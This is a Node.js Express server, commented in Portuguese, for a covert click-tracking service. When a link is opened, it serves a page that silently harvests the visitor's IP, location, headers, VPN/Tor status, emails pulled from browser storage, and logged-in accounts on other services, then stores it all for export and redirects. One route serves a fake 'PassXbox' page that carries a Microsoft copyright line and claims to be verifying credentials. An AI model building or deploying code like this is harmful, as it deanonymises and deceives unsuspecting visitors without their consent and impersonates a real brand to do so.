const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || 'localhost:3000'; // Pode ser configurado para um domínio real

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Inicializar banco de dados
const db = new sqlite3.Database('./tracker.db');

// Criar tabelas
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY,
    original_url TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    click_count INTEGER DEFAULT 0
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT NOT NULL,
    ip_address TEXT,
    user_agent TEXT,
    referrer TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    data TEXT,
    vpn_proxy TEXT,
    risk_score INTEGER DEFAULT 0,
    emails TEXT,
    linked_accounts TEXT,
    FOREIGN KEY (link_id) REFERENCES links(id)
  )`);
  
  // Tabela para emails encontrados
  db.run(`CREATE TABLE IF NOT EXISTS emails (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    click_id INTEGER,
    source TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (click_id) REFERENCES clicks(id)
  )`);
  
  // Tabela para contas vinculadas
  db.run(`CREATE TABLE IF NOT EXISTS linked_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    click_id INTEGER,
    service TEXT,
    logged_in INTEGER DEFAULT 0,
    user_id TEXT,
    email TEXT,
    indicators TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (click_id) REFERENCES clicks(id)
  )`);
  
  db.run(`CREATE INDEX IF NOT EXISTS idx_email ON emails(email)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_service ON linked_accounts(service)`);

  db.run(`CREATE INDEX IF NOT EXISTS idx_link_id ON clicks(link_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_ip_address ON clicks(ip_address)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_timestamp ON clicks(timestamp)`);
});

// Função auxiliar para fazer requisições HTTP
function httpRequest(url) {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https') ? https : http;
    protocol.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    }).on('error', reject);
  });
}

// Função para detectar VPN/Proxy usando APIs externas
async function detectVPNProxy(ip) {
  const results = {
    isVPN: false,
    isProxy: false,
    isTor: false,
    provider: null,
    confidence: 0,
    sources: []
  };

  // API 1: ipapi.co (gratuita, limitada)
  try {
    const ipapiData = await httpRequest(`https://ipapi.co/${ip}/json/`);
    if (ipapiData.org && (ipapiData.org.toLowerCase().includes('vpn') || 
        ipapiData.org.toLowerCase().includes('proxy') ||
        ipapiData.org.toLowerCase().includes('hosting'))) {
      results.isVPN = true;
      results.provider = ipapiData.org;
      results.confidence += 30;
      results.sources.push('ipapi.co');
    }
  } catch (e) {
    // Ignorar erros de API
  }

  // API 2: ip-api.com (gratuita)
  try {
    const ipApiData = await httpRequest(`http://ip-api.com/json/${ip}?fields=66846719`);
    if (ipApiData.proxy === true || ipApiData.hosting === true) {
      results.isProxy = ipApiData.proxy || false;
      results.isVPN = ipApiData.hosting || false;
      results.confidence += 40;
      results.sources.push('ip-api.com');
    }
    if (ipApiData.org) {
      const orgLower = ipApiData.org.toLowerCase();
      if (orgLower.includes('tor') || orgLower.includes('onion')) {
        results.isTor = true;
        results.confidence += 50;
      }
    }
  } catch (e) {
    // Ignorar erros de API
  }

  // Verificar padrões conhecidos de VPN/Proxy via geoip
  const geo = geoip.lookup(ip);
  if (geo) {
    // Verificar se IP está em datacenter conhecido
    // (implementação básica - pode ser expandida)
  }

  return results;
}

// Função para calcular score de risco
function calculateRiskScore(data, vpnProxy) {
  let score = 0;

  // VPN/Proxy aumenta risco
  if (vpnProxy.isVPN || vpnProxy.isProxy) score += 30;
  if (vpnProxy.isTor) score += 50;

  // Comportamento suspeito
  if (data.behavior && data.behavior.suspiciousBehavior) {
    if (data.behavior.suspiciousBehavior.suspicious) {
      score += 20;
      score += data.behavior.suspiciousBehavior.reasons.length * 5;
    }
  }

  // Automação detectada
  if (data.browser && data.browser.automation) {
    if (data.browser.automation.webdriver) score += 40;
    if (data.browser.automation.bot) score += 30;
  }

  // Modo privado pode indicar tentativa de ocultação
  if (data.browser && data.browser.privateMode === true) {
    score += 10;
  }

  // Pouco tempo na página pode indicar bot
  if (data.behavior && data.behavior.timeOnPage) {
    if (data.behavior.timeOnPage < 1000) score += 15;
  }

  return Math.min(score, 100); // Máximo 100
}

// API: Criar novo link de rastreamento
app.post('/api/create-link', (req, res) => {
  const { url, usePassXbox, customDomain } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: 'URL é obrigatória' });
  }

  const linkId = uuidv4().substring(0, 8);
  
  // Se usePassXbox for true, criar link camuflado
  let trackingUrl;
  const host = req.get('host');
  
  if (usePassXbox) {
    // Se tiver domínio customizado, usar ele
    if (customDomain) {
      // Remover http:// ou https:// se tiver
      const cleanDomain = customDomain.replace(/^https?:\/\//, '').replace(/\/$/, '');
      trackingUrl = `https://${cleanDomain}/${linkId}`;
    } else if (host.includes('localhost') || host.includes('127.0.0.1')) {
      // Desenvolvimento local
      trackingUrl = `http://${host}/passxbox/${linkId}`;
    } else {
      // Produção sem domínio customizado - usar host atual
      trackingUrl = `${req.protocol}://${host}/passxbox/${linkId}`;
    }
  } else {
    trackingUrl = `${req.protocol}://${host}/t/${linkId}`;
  }

  db.run(
    'INSERT INTO links (id, original_url) VALUES (?, ?)',
    [linkId, url],
    function(err) {
      if (err) {
        return res.status(500).json({ error: 'Erro ao criar link' });
      }
      res.json({ 
        linkId, 
        trackingUrl,
        originalUrl: url,
        isPassXbox: usePassXbox || false
      });
    }
  );
});

// API: Coletar dados do clique (aceita sendBeacon e fetch normal)
app.post('/api/track/:linkId', async (req, res) => {
  const { linkId } = req.params;
  
  // Aceitar dados de sendBeacon (FormData) ou JSON normal
  let data;
  if (req.is('application/json')) {
    data = req.body;
  } else if (req.is('multipart/form-data')) {
    // sendBeacon com FormData
    data = req.body.data ? (typeof req.body.data === 'string' ? JSON.parse(req.body.data) : req.body.data) : req.body;
  } else {
    // Tentar parsear como JSON de qualquer forma
    try {
      if (typeof req.body === 'string') {
        data = JSON.parse(req.body);
      } else if (req.body && typeof req.body === 'object') {
        data = req.body.data ? (typeof req.body.data === 'string' ? JSON.parse(req.body.data) : req.body.data) : req.body;
      } else {
        data = req.body;
      }
    } catch (e) {
      data = req.body;
    }
  }
  
  // Validar que temos dados
  if (!data || typeof data !== 'object') {
    return res.status(400).json({ error: 'Dados inválidos' });
  }

  // Obter IP do cliente (melhorado)
  let ip = req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] ||
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           (req.connection.socket ? req.connection.socket.remoteAddress : null);

  // Limpar IP (remover porta se houver)
  if (ip) {
    ip = ip.split(':').pop(); // Pegar último elemento (IPv6 pode ter múltiplos :)
    if (ip.includes(',')) {
      ip = ip.split(',')[0].trim(); // Pegar primeiro IP se houver múltiplos
    }
  }

  // Processar dados de geolocalização
  const geo = geoip.lookup(ip);
  if (geo) {
    data.geoLocation = {
      country: geo.country,
      region: geo.region,
      city: geo.city,
      latitude: geo.ll[0],
      longitude: geo.ll[1],
      timezone: geo.timezone,
      metro: geo.metro || null,
      range: geo.range || null
    };
  }

  // Processar User-Agent
  const agent = useragent.parse(req.headers['user-agent'] || '');
  data.parsedUserAgent = {
    browser: agent.family,
    browserVersion: agent.toVersion(),
    os: agent.os.family,
    osVersion: agent.os.toVersion(),
    device: agent.device.family
  };

  // Detectar VPN/Proxy
  let vpnProxy = { isVPN: false, isProxy: false, isTor: false, provider: null, confidence: 0 };
  if (ip && ip !== '::1' && ip !== '127.0.0.1') {
    try {
      vpnProxy = await detectVPNProxy(ip);
      data.network.vpnProxy = vpnProxy;
    } catch (e) {
      console.error('Erro ao detectar VPN/Proxy:', e);
    }
  }

  // Calcular score de risco
  const riskScore = calculateRiskScore(data, vpnProxy);
  data.riskScore = riskScore;
  data.riskLevel = riskScore >= 70 ? 'HIGH' : riskScore >= 40 ? 'MEDIUM' : 'LOW';

  // Adicionar IP e timestamp
  data.ipAddress = ip;
  data.serverTimestamp = new Date().toISOString();

  // Adicionar headers HTTP adicionais
  data.httpHeaders = {
    accept: req.headers['accept'],
    acceptEncoding: req.headers['accept-encoding'],
    acceptLanguage: req.headers['accept-language'],
    connection: req.headers['connection'],
    host: req.headers['host'],
    origin: req.headers['origin'],
    secFetchDest: req.headers['sec-fetch-dest'],
    secFetchMode: req.headers['sec-fetch-mode'],
    secFetchSite: req.headers['sec-fetch-site'],
    secFetchUser: req.headers['sec-fetch-user'],
    upgradeInsecureRequests: req.headers['upgrade-insecure-requests'],
    xForwardedFor: req.headers['x-forwarded-for'],
    xRealIp: req.headers['x-real-ip']
  };

  // Preparar string de VPN/Proxy para banco
  const vpnProxyStr = JSON.stringify(vpnProxy);
  
  // Extrair emails e contas vinculadas
  const emails = data.accounts?.emails || [];
  const linkedAccounts = data.accounts?.linkedAccounts || {};
  const emailsStr = JSON.stringify(emails);
  const linkedAccountsStr = JSON.stringify(linkedAccounts);

  // Salvar no banco
  db.run(
    'INSERT INTO clicks (link_id, ip_address, user_agent, referrer, data, vpn_proxy, risk_score, emails, linked_accounts) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
    [linkId, ip, req.headers['user-agent'] || '', req.headers['referer'] || '', JSON.stringify(data), vpnProxyStr, riskScore, emailsStr, linkedAccountsStr],
    function(err) {
      if (err) {
        console.error('Erro ao salvar clique:', err);
        return res.status(500).json({ error: 'Erro ao salvar dados' });
      }

      const clickId = this.lastID;

      // Salvar emails encontrados
      if (emails.length > 0) {
        emails.forEach(email => {
          db.run('INSERT INTO emails (email, click_id, source) VALUES (?, ?, ?)', 
            [email, clickId, 'browser_storage']);
        });
      }

      // Salvar contas vinculadas
      Object.keys(linkedAccounts).forEach(service => {
        const account = linkedAccounts[service];
        if (account.loggedIn) {
          db.run('INSERT INTO linked_accounts (click_id, service, logged_in, user_id, email, indicators) VALUES (?, ?, ?, ?, ?, ?)',
            [clickId, service, 1, account.userId || account.username || null, account.email || null, JSON.stringify(account.indicators || [])]);
        }
      });

      // Atualizar contador de cliques
      db.run('UPDATE links SET click_count = click_count + 1 WHERE id = ?', [linkId]);

      // Buscar URL original para redirecionamento
      db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
        if (err || !row) {
          return res.status(404).json({ error: 'Link não encontrado' });
        }
        res.json({ 
          redirectUrl: row.original_url,
          riskScore: riskScore,
          riskLevel: data.riskLevel,
          emailsFound: emails.length,
          accountsFound: Object.keys(linkedAccounts).filter(s => linkedAccounts[s].loggedIn).length
        });
      });
    }
  );
});

// API: Obter dados de um link
app.get('/api/link/:linkId', (req, res) => {
  const { linkId } = req.params;

  db.get('SELECT * FROM links WHERE id = ?', [linkId], (err, link) => {
    if (err || !link) {
      return res.status(404).json({ error: 'Link não encontrado' });
    }

    db.all('SELECT * FROM clicks WHERE link_id = ? ORDER BY timestamp DESC', [linkId], (err, clicks) => {
      if (err) {
        return res.status(500).json({ error: 'Erro ao buscar cliques' });
      }

      const clicksWithData = clicks.map(click => ({
        ...click,
        data: JSON.parse(click.data || '{}')
      }));

      res.json({
        link,
        clicks: clicksWithData
      });
    });
  });
});

// API: Listar todos os links
app.get('/api/links', (req, res) => {
  db.all('SELECT * FROM links ORDER BY created_at DESC', (err, links) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar links' });
    }
    res.json(links);
  });
});

// API: Estatísticas gerais
app.get('/api/stats', (req, res) => {
  db.get('SELECT COUNT(*) as totalLinks FROM links', (err, linkCount) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
    }

    db.get('SELECT COUNT(*) as totalClicks FROM clicks', (err, clickCount) => {
      if (err) {
        return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
      }

      db.all('SELECT COUNT(DISTINCT ip_address) as uniqueIPs FROM clicks', (err, uniqueIPs) => {
        if (err) {
          return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
        }

        db.all(`SELECT COUNT(*) as highRisk FROM clicks WHERE risk_score >= 70`, (err, highRisk) => {
          if (err) {
            return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
          }

          res.json({
            totalLinks: linkCount.totalLinks,
            totalClicks: clickCount.totalClicks,
            uniqueIPs: uniqueIPs[0].uniqueIPs,
            highRiskClicks: highRisk[0].highRisk
          });
        });
      });
    });
  });
});

// API: Buscar cliques por IP
app.get('/api/clicks-by-ip/:ip', (req, res) => {
  const { ip } = req.params;
  db.all('SELECT * FROM clicks WHERE ip_address = ? ORDER BY timestamp DESC', [ip], (err, clicks) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar cliques' });
    }

    const clicksWithData = clicks.map(click => ({
      ...click,
      data: JSON.parse(click.data || '{}'),
      vpnProxy: JSON.parse(click.vpn_proxy || '{}')
    }));

    res.json(clicksWithData);
  });
});

// API: Exportar dados (CSV)
app.get('/api/export/:linkId', (req, res) => {
  const { linkId } = req.params;

  db.all('SELECT * FROM clicks WHERE link_id = ? ORDER BY timestamp DESC', [linkId], (err, clicks) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao exportar dados' });
    }

    // Criar CSV
    let csv = 'ID,Link ID,IP Address,User Agent,Referrer,Timestamp,Risk Score,VPN/Proxy,Emails,Linked Accounts\n';
    
    clicks.forEach(click => {
      const vpnProxy = JSON.parse(click.vpn_proxy || '{}');
      const vpnProxyStr = vpnProxy.isVPN ? 'VPN' : vpnProxy.isProxy ? 'Proxy' : vpnProxy.isTor ? 'Tor' : 'No';
      const emails = JSON.parse(click.emails || '[]');
      const accounts = JSON.parse(click.linked_accounts || '{}');
      const accountsList = Object.keys(accounts).filter(s => accounts[s].loggedIn).join(';');
      
      csv += `${click.id},${click.link_id},"${click.ip_address}","${click.user_agent}","${click.referrer}",${click.timestamp},${click.risk_score},${vpnProxyStr},"${emails.join(';')}","${accountsList}"\n`;
    });

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="tracking_data_${linkId}.csv"`);
    res.send(csv);
  });
});

// API: Buscar emails encontrados
app.get('/api/emails', (req, res) => {
  db.all('SELECT DISTINCT email, COUNT(*) as count, MAX(timestamp) as last_seen FROM emails GROUP BY email ORDER BY last_seen DESC', (err, emails) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar emails' });
    }
    res.json(emails);
  });
});

// API: Buscar contas vinculadas por serviço
app.get('/api/accounts/:service', (req, res) => {
  const { service } = req.params;
  db.all('SELECT * FROM linked_accounts WHERE service = ? ORDER BY timestamp DESC', [service], (err, accounts) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar contas' });
    }
    res.json(accounts);
  });
});

// Rota especial para passxbox.com (página camuflada)
app.get('/passxbox/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  // Verificar se o link existe
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).send('Link não encontrado');
    }

    // Servir página camuflada do PassXbox
    const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PassXbox - Acesse sua Conta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #107c10 0%, #0e6b0e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            padding: 40px;
            text-align: center;
        }
        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            background: linear-gradient(135deg, #107c10 0%, #0e6b0e 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            color: white;
            font-weight: bold;
        }
        h1 { color: #107c10; font-size: 28px; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
        .loading-container { margin: 30px 0; }
        .loading-text { color: #107c10; font-size: 16px; margin-bottom: 20px; font-weight: 500; }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #107c10;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #666; font-size: 13px; margin-top: 20px; }
        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            color: #999;
            font-size: 12px;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #107c10, #0e6b0e);
            width: 0%;
            animation: progress 1.5s ease-in-out forwards;
        }
        @keyframes progress { to { width: 100%; } }
    </style>
    <script src="/collector.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">X</div>
        <h1>PassXbox</h1>
        <p class="subtitle">Verificando suas credenciais...</p>
        <div class="loading-container">
            <div class="loading-text">Conectando ao servidor...</div>
            <div class="spinner"></div>
            <div class="progress-bar"><div class="progress-fill"></div></div>
            <div class="status" id="status">Aguarde, estamos processando sua solicitação...</div>
        </div>
        <div class="footer">
            <p>© 2024 Microsoft Corporation. Todos os direitos reservados.</p>
            <p style="margin-top: 5px;">Você será redirecionado em instantes...</p>
        </div>
    </div>
    <script>
        (function() {
            const linkId = '${linkId}';
            const redirectUrl = '${row.original_url}';
            let dataCollected = false;
            let redirectAttempted = false;
            const statusEl = document.getElementById('status');
            const statuses = [
                'Verificando credenciais...',
                'Conectando ao servidor Microsoft...',
                'Validando sua conta...',
                'Preparando redirecionamento...',
                'Quase lá...'
            ];
            let statusIndex = 0;
            const statusInterval = setInterval(() => {
                if (statusIndex < statuses.length) {
                    statusEl.textContent = statuses[statusIndex];
                    statusIndex++;
                }
            }, 300);
            function collectSilently() {
                if (!dataCollected && linkId) {
                    collectAllData(linkId).then(() => {
                        dataCollected = true;
                        clearInterval(statusInterval);
                        statusEl.textContent = 'Redirecionando...';
                    }).catch(() => {});
                }
            }
            collectSilently();
            setTimeout(collectSilently, 400);
            setTimeout(() => {
                collectSilently();
                setTimeout(() => {
                    if (!redirectAttempted) {
                        redirectAttempted = true;
                        window.location.href = redirectUrl;
                    }
                }, 300);
            }, 1200);
            setTimeout(() => {
                if (!redirectAttempted && redirectUrl) {
                    redirectAttempted = true;
                    window.location.href = redirectUrl;
                }
            }, 2000);
        })();
    </script>
</body>
</html>`;

    res.send(html);
  });
});

// API: Obter URL de redirecionamento
app.get('/api/get-redirect/:linkId', (req, res) => {
  const { linkId } = req.params;
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).json({ error: 'Link não encontrado' });
    }
    res.json({ redirectUrl: row.original_url });
  });
});

// Rota de rastreamento: coleta dados e redireciona
app.get('/t/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  // Verificar se o link existe
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).send('Link não encontrado');
    }

    // Servir página HTML que coleta dados SILENCIOSAMENTE e redireciona
    const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
        }
        .loader {
            width: 50px;
            height: 50px;
            margin: 100px auto;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script src="/collector.js"></script>
</head>
<body>
    <div class="loader"></div>
    <script>
        // COLETA SILENCIOSA - SEM PEDIR PERMISSÃO
        (function() {
            const linkId = '${linkId}';
            const redirectUrl = '${row.original_url}';
            
            // Coletar dados imediatamente em background (sem bloquear)
            let dataCollected = false;
            
            // Função de coleta silenciosa
            function collectSilently() {
                if (!dataCollected) {
                    collectAllData(linkId).then((result) => {
                        dataCollected = true;
                        // Dados coletados silenciosamente
                    }).catch(() => {
                        // Erro silencioso - não mostrar nada
                    });
                }
            }
            
            // Coletar imediatamente
            collectSilently();
            
            // Coletar novamente após 500ms (para pegar mais dados de comportamento)
            setTimeout(collectSilently, 500);
            
            // Coletar uma última vez antes de redirecionar
            setTimeout(() => {
                collectSilently();
                // Redirecionar após coleta
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 200);
            }, 800); // Reduzido para 800ms - coleta rápida e silenciosa
            
            // Fallback - redirecionar mesmo se houver erro
            setTimeout(() => {
                if (!dataCollected) {
                    collectSilently();
                }
                window.location.href = redirectUrl;
            }, 1200); // Máximo 1.2 segundos
        })();
    </script>
</body>
</html>`;

    res.send(html);
  });
});

// Rota raiz: dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Exportar para Vercel
module.exports = app;

// Iniciar servidor apenas se não estiver na Vercel
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
  });
}
